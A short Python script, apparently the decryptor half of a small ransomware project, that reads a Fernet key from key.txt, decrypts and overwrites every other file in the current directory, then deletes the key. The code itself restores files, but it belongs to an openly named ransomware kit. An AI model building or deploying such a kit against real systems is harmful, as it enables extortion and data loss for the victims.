# Import necessary libraries
import os
from cryptography.fernet import Fernet

# List to store target files
Targets = []

# Iterate through files in the current directory
for file in os.listdir():
    # Exclude certain files from the target list
    if file == "Ransomware.py" or file == "key.txt" or file == "Decoder.py":
        continue
    Targets.append(file)
print(Targets)

# Open the key file in binary mode and read the key
KeyFile = open("key.txt", 'rb')
Key = KeyFile.read()

# Initialize Fernet with the read key
Key = Fernet(Key)

# Decrypt and overwrite contents of each target file
for file in Targets:
    # Open the file in text mode and read its contents
    TheFile = open(file, "r")
    Contents = TheFile.read()

    # Decrypt the content using the Fernet key
    Decrypted_Content = Key.decrypt(Contents.encode()).decode()

    # Display the decrypted content
    print(Decrypted_Content)

    # Open the file in text mode and write the decrypted content back to the file
    TheFile = open(file, "w")
    TheFile.write(Decrypted_Content)
    TheFile.close()

# Remove the key file
os.remove("key.txt")